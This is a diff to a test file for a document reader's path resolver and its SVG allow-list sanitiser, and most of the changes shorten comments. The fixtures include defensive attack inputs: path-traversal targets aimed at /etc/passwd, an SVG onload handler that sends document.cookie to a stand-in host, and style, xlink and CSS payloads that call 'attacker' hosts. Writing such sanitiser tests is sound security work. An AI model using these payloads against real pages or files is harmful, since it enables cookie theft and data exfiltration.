@@ -1,22 +1,17 @@
 // The document reader's four decisions (ui/documents.ts).
 //
-// Most of that module is a walk over a parsed XML tree and needs a DOM to test
-// at all. These four do not: they are the pieces where the module decides
-// something rather than copies something, and two of them are the difference
-// between a reader and a way out of the archive.
+// Most of that module walks a parsed XML tree and needs a DOM to test. These
+// four don't - they're where the module decides rather than copies, and two
+// are the difference between a reader and a way out of the archive.
 //
-// resolveFrom() is the one that matters most. Every picture drawn out of a
-// document is named by a relationship target the *document* supplied, and the
-// rule is that a target is resolved and then *looked up* in the archive's own
-// key set - never opened as a path. These tests hold the resolver to producing a
-// key, so a target that climbs out of the package produces a key that is not in
-// the archive rather than a path that is somewhere on a disk.
+// resolveFrom() matters most: a relationship target is resolved then looked
+// up in the archive's own key set, never opened as a path. These tests hold
+// it to producing a key - a target climbing out of the package produces a
+// key absent from the archive, not a path on disk.
 //
-// It and slideNo() are imported from import/ooxml.ts rather than from the reader
-// now: the deck compositor in import/slide.ts walks the same containers, the
-// importer may not reach into ui/, and a file format with two answers to "where
-// does this picture live" is the disagreement worth spending a module to avoid.
-// The tests follow the functions.
+// It and slideNo() live in import/ooxml.ts, not the reader, since
+// import/slide.ts walks the same containers and the importer may not reach
+// into ui/.
 
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
@@ -32,8 +27,8 @@ test('it claims the formats it has readers for', () => {
   }
   // Case does not decide it: meta.ext is whatever the filename had.
   assert.equal(canReadDocument('DOCX'), true);
-  // PDF has a renderer of its own and markdown has one of its own; neither is
-  // this module's, and claiming them here would take the file off both.
+  // PDF and markdown each have their own renderer - claiming them here
+  // would take the file off both.
   for (const ext of ['pdf', 'md', 'jpg', 'mp4', 'zip', '', undefined, null]) {
     assert.equal(canReadDocument(ext), false, String(ext));
   }
@@ -50,10 +45,10 @@ test('a relationship target resolves against the part that named it', () => {
 });
 
 test('a target that climbs out of the package cannot name anything outside it', () => {
-  // It resolves to *some* key; the safety is that the key is then looked up in
-  // the archive, and no archive has an entry called this. What must not happen
-  // is a leading slash or a surviving `..`, either of which would be a path
-  // rather than a key if it ever reached something that opens paths.
+  // It resolves to some key, and the safety is that it's then looked up, not
+  // opened - no archive has an entry called this. A leading slash or a
+  // surviving `..` would be a path, not a key, if it ever reached something
+  // that opens paths.
   for (const evil of ['../../../../etc/passwd', '/etc/passwd', '..\\..\\windows\\win.ini']) {
     const out = resolveFrom('word/', evil);
     assert.doesNotMatch(out, /(^|\/)\.\.(\/|$)/, out);
@@ -79,8 +74,8 @@ test('a column letter becomes its index', () => {
 });
 
 test('a reference that is not one answers -1 rather than a position', () => {
-  // -1 is what makes the caller push the cell on the end instead of padding to
-  // a nonsense column. A row of three values must not become a row of millions.
+  // -1 makes the caller push the cell on the end instead of padding to a
+  // nonsense column.
   for (const bad of ['', '7', '1A', '$A$1', 'a1']) assert.equal(colIndex(bad), -1, bad);
 });
 
@@ -94,8 +89,8 @@ test('parts sort by their number and not by their name', () => {
   assert.deepEqual(sorted, [
     'ppt/slides/slide1.xml', 'ppt/slides/slide2.xml', 'ppt/slides/slide10.xml',
   ]);
-  // Sorted as strings, slide10 lands second and slide2 last - a deck read in
-  // the wrong order, and the whole reason this is not a plain sort.
+  // Sorted as strings, slide10 lands second and slide2 last - why this isn't
+  // a plain sort.
   assert.deepEqual([...paths].sort(), [
     'ppt/slides/slide1.xml', 'ppt/slides/slide10.xml', 'ppt/slides/slide2.xml',
   ]);
@@ -146,16 +141,14 @@ test('an empty file has no rows', () => {
 // ---------------------------------------------------------------------------
 // scrub() - the SVG allow-list
 //
-// CLAUDE.md names this as the app's single exception to "nothing that reads a
-// foreign document may touch innerHTML": an SVG is parsed detached and walked,
-// and what survives the walk is imported into the page. It is the only place a
-// stranger's markup is admitted at all, and it had no test in either direction
-// - tests/csp.test.js asserts the policy that is supposed to be the *second*
-// lock, and the first one was defended by nothing.
+// The app's single exception to "nothing that reads a foreign document may
+// touch innerHTML": an SVG is parsed detached, walked, and what survives is
+// imported. tests/csp.test.js asserts the second lock; this is the first,
+// previously untested in either direction.
 //
-// A fake element rather than a DOM, the way tests/markdown.test.js and
-// tests/drawer.test.js do it. It records only what scrub() touches: a local
-// name, an attribute map, children, and text.
+// A fake element rather than a DOM, as tests/markdown.test.js and
+// tests/drawer.test.js do. Records only what scrub() touches: local name,
+// attribute map, children, text.
 // ---------------------------------------------------------------------------
 
 class El {
@@ -194,9 +187,8 @@ class El {
 }
 
 test('the root element is scrubbed, not only its children', () => {
-  // `<svg onload="...">` is the classic form and it survived: the walk iterated
-  // node.children and never looked at the node it was handed, so every
-  // attribute on the document element went into the page verbatim.
+  // `<svg onload="...">` survived because the walk iterated node.children
+  // without checking the node it was handed.
   const root = new El('svg', {
     xmlns: 'http://www.w3.org/2000/svg',
     onload: "fetch('//x/' + document.cookie)",
@@ -223,19 +215,16 @@ test('an event handler is dropped wherever it is', () => {
 });
 
 test('a style attribute is a reference to somewhere else', () => {
-  // The module header says "every attribute that is a reference to somewhere
-  // else is dropped", and the filter had no case for `style` - so
-  // style="fill:url(//attacker/track.svg#a)" on any allowed child reached the
-  // page and made the request.
+  // The filter had no case for `style`, so
+  // style="fill:url(//attacker/track.svg#a)" reached the page and fired.
   const root = new El('svg', {}, [new El('rect', { style: 'fill:url(//attacker/track.svg#a)' })]);
   scrub(root);
   assert.equal(root.children[0].has('style'), false);
 });
 
 test('a style element is emptied, because its CSS is not scoped to the drawing', () => {
-  // An inline <style> inside an SVG subtree is a *document* stylesheet. SVG_OK
-  // carries 'style' and nothing ever filtered text content, so an opened
-  // drawing could restyle and leak from the whole app.
+  // An inline <style> in an SVG subtree is a document stylesheet - nothing
+  // filtered text content, so an opened drawing could restyle the whole app.
   const style = new El('style', {});
   style.text = '*{display:none} input[value^="a"]{background:url(//x/a)}';
   const root = new El('svg', {}, [style]);
@@ -245,8 +234,8 @@ test('a style element is emptied, because its CSS is not scoped to the drawing',
 });
 
 test('an xlink href is caught under any prefix the file chose', () => {
-  // The test named `xlink:href` literally, and a prefix is the author's to
-  // choose: binding the same namespace as `xl:` kept the attribute.
+  // A prefix is the author's to choose: binding the same namespace as `xl:`
+  // used to keep the attribute.
   const root = new El('svg', {}, [
     new El('use', { 'xlink:href': 'https://attacker/x.svg#a' }),
     new El('use', { 'xl:href': 'https://attacker/x.svg#a' }),
@@ -259,8 +248,7 @@ test('an xlink href is caught under any prefix the file chose', () => {
 });
 
 test('a fragment reference is the one form kept', () => {
-  // <use href="#thing"> is how an SVG refers to its own parts, and dropping it
-  // would break every legitimate symbol.
+  // Dropping this would break every legitimate symbol.
   const root = new El('svg', {}, [new El('use', { href: '#thing' })]);
   scrub(root);
   assert.equal(root.children[0].getAttribute('href'), '#thing');
@@ -293,8 +281,7 @@ test('a tree deeper than the cap is emptied rather than overflowing the stack', 
 });
 
 test('an ordinary drawing comes through unchanged', () => {
-  // The half that matters as much as the refusals: a sanitiser that eats real
-  // files is a sanitiser people turn off.
+  // Matters as much as the refusals: a sanitiser that eats real files gets turned off.
   const root = new El('svg', { xmlns: 'http://www.w3.org/2000/svg', viewBox: '0 0 16 16' }, [
     new El('g', { fill: 'none', stroke: 'currentColor' }, [
       new El('path', { d: 'M1 1 L15 15', 'stroke-width': '2' }),
